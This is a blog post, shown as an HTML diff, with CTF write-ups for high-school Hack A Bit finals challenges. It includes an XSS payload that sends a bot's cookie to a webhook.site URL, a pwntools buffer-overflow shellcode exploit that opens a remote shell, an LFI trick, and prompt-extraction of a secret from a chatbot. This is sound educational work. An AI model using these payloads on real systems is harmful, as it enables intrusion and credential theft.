@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Full Writeups - Hack A Bit CTF Finals 0x01 :: uwuTeddy</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Full writeups for all challenges for the finals of a beginner CTF." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://TheSavageTeddy.github.io/posts/writeups-hackabit2023finals/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://TheSavageTeddy.github.io/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://TheSavageTeddy.github.io/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://TheSavageTeddy.github.io/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="theuwuteddy" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Full Writeups - Hack A Bit CTF Finals 0x01">
+<meta property="og:description" content="Full writeups for all challenges for the finals of a beginner CTF." />
+<meta property="og:url" content="https://TheSavageTeddy.github.io/posts/writeups-hackabit2023finals/" />
+<meta property="og:site_name" content="uwuTeddy" />
+
+  
+    <meta property="og:image" content="https://TheSavageTeddy.github.io/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="CTF Writeups" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    uwuTeddy / TheSavageTeddy
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://TheSavageTeddy.github.io/posts/writeups-hackabit2023finals/">Full Writeups - Hack A Bit CTF Finals 0x01</a>
+  </h1>
+  <div class="post-meta">
+    
+    
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/beginner/">beginner</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><a href="https://www.hackabit.com/">Hack a Bit</a> is a competition for highschoolers with the aim to promote cybersecurity. This round was the finals and I managed to place <code>2nd</code> overall!</p>
+
+  <img src="./img/scoreboard.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Below are writeups for all the challenges in the finals. If I&rsquo;ve missed anything or made a mistake like a typo, please let me know on discord <code>TheSavageTeddy#7458</code>. Enjoy!</p>
+<h1 id="challenge-categories">Challenge Categories<a href="#challenge-categories" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><a href="#1-dvgpt"><code>dvGPT</code> (Web Exploitation)</a> - 4 challenges</p>
+<p><a href="#2-corruption"><code>Corruption</code> (Rev/Binary Exploitation)</a> - 4 challenges</p>
+<p><a href="#3-triage"><code>Triage</code> (Cryptography/Forensics)</a> - 4 challenges</p>
+<p><a href="#4-range--zz-king-of-the-hill"><code>Range &amp; King of The Hill</code> (Machines/Attack Defense)</a> - 4 challenges + 8 Attack Defense Flags</p>
+<h1 id="1-dvgpt">1. dvGPT<a href="#1-dvgpt" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This category contained 4 web challenges, all based on the same website, hosting chatbot similar to chatGPT, which was quite interesting and fun!</p>
+<h2 id="leaky-75">Leaky (75)<a href="#leaky-75" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>People leave dumb comments about vulnerabilities all over client-side code&hellip; most modern web applications don&rsquo;t display all the possible code at once though, for a variety of reasons.</p>
+</blockquote>
+<p>We are given a link to a website, which hosts an AI similar to chatGPT. The description hints at &lsquo;client-side code&rsquo; so we inspect element, and find the flag in a javascript file in 2 parts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>                <span style="color:#66d9ef">class</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;intro-window&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;flag{the_DOM_is_like_&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>              , <span style="color:#a6e22e">Z</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">P</span>((()=&gt;(<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">_</span>)(<span style="color:#e6db74">&#34;div&#34;</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">class</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;tag&#34;</span>
+</span></span><span style="display:flex;"><span>            }, <span style="color:#e6db74">&#34;It&#39;s a dumpster fire.&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))
+</span></span><span style="display:flex;"><span>              , <span style="color:#a6e22e">z</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">key</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">class</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;chats&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;crazy_virtual_maaaan}&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span></code></pre></div><p>Flag: <code>flag{the_DOM_is_like_crazy_virtual_maaaan}</code></p>
+<h2 id="extractor-100">Extractor (100)<a href="#extractor-100" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>We gave dvGPT a flag and for some reason trust it to keep it safe. These AIs are super duper secure my dude.</p>
+</blockquote>
+<p>Sounds like prompt engineering. We simply ask for the flag, in words I guess.</p>
+
+  <img src="./img/web1.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Flag: `flag{hey_you&rsquo;re_not_robert}</p>
+<h2 id="badml-125">BadML (125)<a href="#badml-125" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>Where does all this data come from? Have you found all the app endpoints?</p>
+</blockquote>
+<blockquote>
+<p>The flag is located at ./flag.txt</p>
+</blockquote>
+<p>Lets look around the website. Using burpsuite, we can find what resources the website requests and loads, and upon some digging we find it sends a get request to <code>/footer?message=default</code> to get the footer message.</p>
+
+  <img src="./img/web2.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Seems like <code>default</code> is some sort of file containing the footer message, what if we try <code>flag.txt</code> instead?</p>
+
+  <img src="./img/web3.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>And we get the flag: <code>flag{LFI_LetsgoFindIt}</code>. Note that you don&rsquo;t need to use burpsuite repeater - visiting <code>/footer?message=flag.txt</code> works too.</p>
+<h2 id="badai-150">BadAI (150)<a href="#badai-150" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>So we have this guy named Bill that works here&ndash;he handles the support tickets for dvGPT. If you have any problems let us know and Bill will check it out. Bill does nothing but stare at the ticket feed, so you can expect him to check your request within a couple seconds.</p>
+</blockquote>
+<blockquote>
+<p>Bill can only view pages from dvGPT though, so don&rsquo;t bother sending him anything else.</p>
+</blockquote>
+<blockquote>
+<p>The flag is stored in a cookie in Bill&rsquo;s browser.</p>
+</blockquote>
+<blockquote>
+<p>&ndash; If you think you&rsquo;re close feel free to DM me (Nate) and I will help you depending on what you&rsquo;re asking and how close you are. There are some browser nuances you might not be aware of and if you are 99% of the way there we&rsquo;ll probably give it to you.</p>
+</blockquote>
+<p>Every part of the description hints to this being an <a href="https://portswigger.net/web-security/cross-site-scripting">XSS</a> challenge - almost every time when the goal is to steal a bot&rsquo;s cookie, it is done through XSS.</p>
+
+  <img src="./img/web4.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Looking around the site again, we find a place to submit a form - to Bill (the bot). However, as the description says, <code>Bill can only view pages from dvGPT</code>, so we need to find an XSS somewhere in the dvGPT site. An interesting thing is that visiting any invalid page returns a status code of 200 - along with our text! We can indeed inject arbitary code and gain reflected XSS in here.</p>
+
+  <img src="./img/web5.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>So now we need to come up with a payload. There are already many payloads to steal cookies online by sending a GET request to a webhook with the cookie as a parameter, but after some experimenting around this seemed to work.</p>
+<p><code>https://wtashuxsyj.final.hackabit.com/&lt;script&gt;document.location=atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvMTI2YzhiNjUtOTJiYi00ZDg4LWFhYmQtYmYxNDkxMmE4OTEwLz9hPQ==')+btoa(document.cookie)&lt;/script&gt;</code></p>
+<p>It simply executes javascript which redirects the bot to my <a href="https://webhook.site/">online webhook</a> with the base64 encoded cookie as a parameter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://webhook.site/126c8b65-92bb-4d88-aabd-bf14912a8910/?a=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p>I base64 encoded the webhook url as the <code>?</code> character would confuse the URL string into thinking it was a parameter for the main site&rsquo;s url (<code>wtashuxsyj.final.hackabit.com</code>).</p>
+<p>Checking the webhook we get the flag: <code>flag{mirroring_to_the_max}</code></p>
+
+  <img src="./img/web6.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<h1 id="2-corruption">2. Corruption<a href="#2-corruption" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This category contained 4 challenges based on binaries - reverse engineering and binary exploitation were needed to solve all 4! Also, all the challenges used the same binary&hellip;</p>
+<h2 id="santa-75">Santa (75)<a href="#santa-75" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>You all asked for it so here it is, an intro to binary exploitation!</p>
+</blockquote>
+<blockquote>
+<p>Let&rsquo;s get started nice and simple, baby steps to reverse engineering (RE).</p>
+</blockquote>
+<blockquote>
+<p>All challenges in this section use the same binary. The target is x86 and ASLR is on but it shouldn&rsquo;t be relevant to any of your exploits.</p>
+</blockquote>
+<p>We get a binary file. We can simply strings grep the file to get the flag - not much reverse engineering involved, I guess. Flag: <code>flag{baby_steps_gift_just_for_you}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>uwuteddy@DESKTOP-5BVRVO8:~$ strings corruption |grep -i flag
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>baby_steps_gift_just_for_you<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>flag_function
+</span></span><span style="display:flex;"><span>controller_flag
+</span></span></code></pre></div><h1 id="coredump-100">Coredump (100)<a href="#coredump-100" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<blockquote>
+<p>Now that we have at least inspected the binary, lets go a bit deeper. You can&rsquo;t just overflow the buffer with a bunch of A&rsquo;s&ndash;reverse engineer the software and figure out your payload format. Smash the stack to get the flag, no control necessary yet. Once you have a working exploit, fire it against the remote target to get the real flag.</p>
+</blockquote>
+<p>From the description: smash the stack, no control necessary <em>yet</em>. Upon running the binary locally, and smashing the stack by sending a bunch of characters, nothing really happens. Decompiling the binary <a href="https://dogbolt.org/?id=a1a87852-0a8c-451d-a408-efcc14a3d4a9">online</a> we see what is going on - it seems like these flags are loaded from environment variables, which are of course, not set locally.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">flag_function</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v0; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;HAB_BITSANDBYTES&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(v0);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fflush</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//----- (08049264) --------------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">controller_flag</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v0; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;HAB_CONTROLLER&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(v0);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fflush</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Additionally, we can see the main function of the program.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> v3; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v4; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">500</span>]; <span style="color:#75715e">// [esp+0h] [ebp-236h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> dest[<span style="color:#ae81ff">50</span>]; <span style="color:#75715e">// [esp+1F4h] [ebp-42h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s2; <span style="color:#75715e">// [esp+226h] [ebp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v9; <span style="color:#75715e">// [esp+22Ah] [ebp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>p_argc; <span style="color:#75715e">// [esp+22Eh] [ebp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  p_argc <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>argc;
+</span></span><span style="display:flex;"><span>  v9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  s2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;UNLOCK&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You might need this: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, flag_function);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;this might help too: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Talk to me Maverick: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(s, <span style="color:#ae81ff">500</span>, stdin);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(s2);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(s, s2, v3) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Copying into the destination now...&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(dest, s, <span style="color:#ae81ff">0x3Cu</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v9 )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;HAB_COREDUMP&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;STACK SMASHING DETECTED... but we&#39;ll allow it ;) %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v4);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fflush</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vulnerable_function</span>(s);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Of course, the flag isn&rsquo;t going to be set in our environment variable locally, so we&rsquo;ll have to connect to remote to smash the stack and get the flag there.</p>
+
+  <img src="./img/pwn1.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Huh. We don&rsquo;t get the flag, or any message. Let&rsquo;s actually read the decompiled code.</p>
+<p>We find out on this line <code>if ( !strncmp(s, s2, v3) )</code>, our input is checked to see if it starts with <code>s2</code>. If not, nothing happens. Because <code>s2 = &quot;UNLOCK&quot;;</code>, we just need <code>&quot;UNLOCK&quot;</code> to be at the start of our string. Trying this again, we overflow the <code>v9</code> variable, as the <code>memcpy(dest, s, 0x3Cu);</code> function copies 60 bytes from our buffer <code>s</code> to <code>dest</code>, which only holds 50 bytes, resulting in a buffer overflow which causes <code>v9</code> to be set to anything other than 0, getting us the flag: <code>flag{look_like_ur_a_real_RE}</code></p>
+
+  <img src="./img/pwn2.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<h2 id="bitsandbytes-125--controller-150">bitsANDbytes (125) &amp; Controller (150)<a href="#bitsandbytes-125--controller-150" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>bitsANDbytes:</p>
+<blockquote>
+<p>Now that you have the ability to smash the stack, it&rsquo;s time to get control of the instruction pointer. Use your reverse engineering to figure out proper addresses, we&rsquo;ve given you the code required to pull the flag.</p>
+</blockquote>
+<p>Controller:</p>
+<blockquote>
+<p>Nice, last step, you have a leak but not for the right function, how can we tackle this problem?</p>
+</blockquote>
+<p>Okay, let me address something - remember how these challenges all used the same binary? Well, as discussed previously, the flags were stored in environment variables! That means, if we were to get a shell on the remote, we could simply read the environment variables and get all the flags!!!</p>
+<p>But first of all, let&rsquo;s address the vulnerability. From before, we have a buffer overflow (BOF) vulnerability, but the max bytes we can overwrite is only 10, which usually isn&rsquo;t enough to completely overwrite the return pointer <code>rip</code> to redirect code execution.</p>
+<p>The second vulnerability lies here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">vulnerable_function</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>src)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> dest[<span style="color:#ae81ff">54</span>]; <span style="color:#75715e">// [esp+Eh] [ebp-3Ah] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strcpy</span>(dest, src);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vulnerable_function</span>(s);
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In <code>vulnerable function</code>, our input <code>s</code> is copied into <code>dest</code>, which can only hold <code>54</code> bytes while our input can hold up to <code>500</code> bytes! Additionally, the function uses <code>strcpy</code> which is dangerous as it does not check the size of what it is copying, resulting in another BOF vulnerability. Using this, we can hijack execution flow by overwriting the return address which is popped into <code>rip</code> when the function returns, allowing us to jump to any address we want!</p>
+<p>First, lets calculate the offset - the point at which we start overwriting <code>rip</code>.  The offset can be easily calculated using <code>cyclic</code>, just remember to replace the first 6 characters with &ldquo;UNLOCK&rdquo; so the buffer overflow actually triggers! For more info: <a href="https://ir0nstone.gitbook.io/notes/types/stack/de-bruijn-sequences">https://ir0nstone.gitbook.io/notes/types/stack/de-bruijn-sequences</a></p>
+
+  <img src="./img/pwn5.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>And we get an offset of <code>62</code> bytes until we overflow <code>rip</code>.</p>
+<p>Okay, with the vulnerability found, we can focus on exploiting it.</p>
+<p>There are several ways to get a shell, <a href="https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc">ret2libc</a> being a very common one. However, we aren&rsquo;t given the libc used in this challenge, so it would be a hassle to do ret2libc. Instead, we can do something much simpler.</p>
+<p>When running <code>pwn checksec</code> to check security features on the binary, we find that, it doens&rsquo;t have security features at all&hellip;</p>
+
+  <img src="./img/pwn3.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>If you&rsquo;re unfamiliar with pwn (binary exploitation) and can&rsquo;t spot the issue immediantly - don&rsquo;t worry. In trivial CTF challenges, most of these would be turned off anyways to avoid brute forcing canaries without a leak etc, but one that is almost never turned off is this one:</p>
+<pre tabindex="0"><code>NX:       NX disabled
+</code></pre><p><code>NX</code> stands for &ldquo;<a href="https://ir0nstone.gitbook.io/notes/types/stack/no-execute">No eXecute</a>&rdquo;, and essentially defends against shellcode. Basically, if this is turned off, the computer is unable to differentiate between data and instructions, which means that we can get it to run our own instructions that we provide it, which is extremely dangerous.</p>
+<p>In our buffer input, we can feed it <a href="https://ir0nstone.gitbook.io/notes/types/stack/shellcode">shellcode</a> (which gives us a shell when ran as code), and buffer overflow to redirect the control flow to our input buffer, making the program run whatever code is stored in our buffer. Even more conveniently, the program actually prints the address of our buffer!</p>
+<p>Using this code here, I use <a href="https://docs.pwntools.com/en/stable/">pwntool&rsquo;s</a> very useful <code>shellcraft.sh()</code> function to automatically use shellcode based on the binary architecture (specified by <code>context.binary</code>), and buffer overflow for it to return to my shellcode.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./corruption&#34;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;juieqtrsdp.final.hackabit.com&#34;</span>,<span style="color:#ae81ff">54321</span>)
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;this might help too: &#34;</span>)
+</span></span><span style="display:flex;"><span>buffer_leak <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Leak at: </span><span style="color:#e6db74">{</span>hex(buffer_leak) <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;UNLOCK&#34;</span>,
+</span></span><span style="display:flex;"><span>    asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(offset, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> flat(buffer_leak<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>) <span style="color:#75715e"># Offset by 6 because &#34;UNLOCK&#34; is 6 characters so our shellcode is further down</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>With this script we now gain a shell and are able to execute commands on the remote server!</p>
+
+  <img src="./img/pwn4.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>And from there, we find all the flags in <code>start.sh</code></p>
